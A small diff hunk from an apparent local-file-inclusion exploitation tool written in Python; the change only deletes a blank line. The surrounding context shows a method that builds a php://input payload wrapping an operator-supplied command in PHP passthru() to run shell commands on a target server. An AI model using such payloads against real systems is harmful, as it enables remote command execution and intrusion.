@@ -93,7 +93,6 @@ class lfi(object):
 			com('dataURI')
 			print (lfiObj.dataURI())
 
-	
 	def phpInput(self):
 		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
 		mydata = ("<?php passthru('" + self._command + "'); ?>") if self._isShell else \
